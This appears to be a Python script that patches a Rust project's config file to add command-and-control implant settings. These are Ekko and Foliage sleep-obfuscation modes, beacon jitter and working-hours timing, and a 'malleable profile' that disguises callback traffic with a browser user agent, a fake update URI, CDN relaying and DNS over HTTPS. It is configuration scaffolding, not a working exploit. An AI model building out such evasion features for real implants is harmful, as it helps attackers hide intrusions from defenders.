with open("common/src/config.rs", "r") as f:
    text = f.read()

sleep_and_malleable = """
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SleepMethod {
    Ekko,
    Foliage,
    Standard,
}

impl Default for SleepMethod {
    fn default() -> Self {
        SleepMethod::Standard
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SleepConfig {
    #[serde(default)]
    pub method: SleepMethod,
    #[serde(default = "default_base_interval")]
    pub base_interval_secs: u64,
    #[serde(default = "default_jitter_percent")]
    pub jitter_percent: u32,
    #[serde(default)]
    pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
    #[serde(default)]
    pub working_hours_end: Option<u32>,   // e.g. 17 for 17:00
    #[serde(default)]
    pub off_hours_multiplier: Option<f32>,
}

fn default_base_interval() -> u64 { 30 }
fn default_jitter_percent() -> u32 { 20 }

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            method: SleepMethod::Standard,
            base_interval_secs: default_base_interval(),
            jitter_percent: default_jitter_percent(),
            working_hours_start: None,
            working_hours_end: None,
            off_hours_multiplier: None,
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub struct MalleableProfile {
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_uri")]
    pub uri: String,
    #[serde(default = "default_host_header")]
    pub host_header: String,
    #[serde(default)]
    pub cdn_relay: bool,
    #[serde(default)]
    pub dns_over_https: bool,
}

fn default_user_agent() -> String { "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string() }
fn default_uri() -> String { "/api/v1/update".to_string() }
fn default_host_header() -> String { "cdn.example.com".to_string() }

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            user_agent: default_user_agent(),
            uri: default_uri(),
            host_header: default_host_header(),
            cdn_relay: false,
            dns_over_https: false,
        }
    }
}

"""

if "MalleableProfile" not in text:
    text = text.replace("#[derive(Serialize, Deserialize, Debug, Clone)]\n#[serde(rename_all = \"kebab-case\")]\npub struct Config {", sleep_and_malleable + "\n#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]\n#[serde(rename_all = \"kebab-case\")]\npub struct Config {\n    #[serde(default)]\n    pub sleep: SleepConfig,\n    #[serde(default)]\n    pub malleable_profile: MalleableProfile,")

    text = text.replace("port_scan_timeout_ms: default_port_scan_timeout(),", "port_scan_timeout_ms: default_port_scan_timeout(),\n            sleep: SleepConfig::default(),\n            malleable_profile: MalleableProfile::default(),")

with open("common/src/config.rs", "w") as f:
    f.write(text)

